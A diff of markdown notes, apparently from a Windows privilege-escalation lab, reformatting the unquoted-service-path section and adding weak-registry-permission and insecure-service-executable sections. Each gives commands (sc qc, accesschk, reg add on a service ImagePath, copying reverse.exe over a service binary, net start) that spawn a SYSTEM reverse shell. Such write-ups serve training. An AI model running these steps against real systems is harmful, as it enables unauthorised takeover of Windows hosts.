@@ -57,13 +57,11 @@ Here is how we do it.
 
 In here we are generating an EXE file which then needs to be run at the target box.
 
-  
 
-   
-   
 
-   
-   
+
+
+
 
 ### Escalation Path 1 - Kernel Exploits
 ----------------------------------------
@@ -121,6 +119,10 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 
 > **net start daclsvc**
 
+  
+
+
+
 
 
 
@@ -128,27 +130,102 @@ Start a listener on Kali and then start the service to spawn a reverse shell run
 ### Escalation Path 3 - Unquoted Service Paths
 --------------------------------------------------
 
-In this escalation path
 
-
-```
-
-
-Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.
+**Step 1:** Query the "unquotedsvc" service and note that it runs with SYSTEM privileges (SERVICE_START_NAME) and that the BINARY_PATH_NAME is unquoted and contains spaces.
 
 > **sc qc unquotedsvc**
 
-Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:
+
+
+**Step 2:** Using accesschk.exe, note that the BUILTIN\Users group is allowed to write to the C:\Program Files\Unquoted Path Service\ directory:
 
 > **C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"**
 
-Copy the reverse.exe executable you created to this directory and rename it Common.exe:
 
-copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
 
-Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+**Step 3:** Copy the reverse.exe executable you created to this directory and rename it Common.exe:
 
-net start unquotedsvc
-```
+
+
+> **copy C:\PrivEsc\reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"**
+
+
+**Step 4:** Start a listener on Kali and then start the service to spawn a reverse shell running with SYSTEM privileges:
+
+
+> **net start unquotedsvc**
+
+
+   
+
+
+
+
+
+### Escalation Path 4 - Weak Registry Permissions
+---------------------------------------------------
+
+
+**Step 1:** Query the culprit service (e.g. regsvc) and note that it run with SYSTEM privileges (SERVICE_START_NAME)
+
+> **sc qc regsvc**
+
+
+
+**Step 2:** Using accesschk.exe note that the registry entry for the culprit service (regsvc) is writable by "NT AUTHORIT\INTERACTIVE" - This group is essentiall all logged on users that include the current user
+
+> **C:\PrivEsc\accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc**
+
+
+
+**Step 3:** Overwrite the ImagePath Registry Key to point to reverse.exe
+
+> **reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f**
+
+
+
+
+**Step 4:** Listen on Netcat after starting the service
+
+> **net start regsvc**
+
+
+
+
+
+
+### Escalation Path 5 - Insecure Service Executables
+------------------------------------------------------
+
+
+**Step 1:** Query the culprit service (e.g. filepermsvc here) and note that it runs with SYSTEM privileges (SERVICE_START_NAME)
+
+
+> **sc qc filepermsvc**
+
+
+
+**Step 2:** Use accesschk.exe and note that the service binary (BINARY_PATH_NAME) file is writable by everyone
+
+> **C:\PrivEsc\accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"**
+
+
+**Step 3:** Copy the reverse.exe to the writable location
+
+> **copy C:\PrivEsc\reverse.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y**
+
+
+
+**Step 4:** Start a listener and initiate the service
+
+> **net start filepermsvc**
+
+
+
+
+
+
+
+
 
 
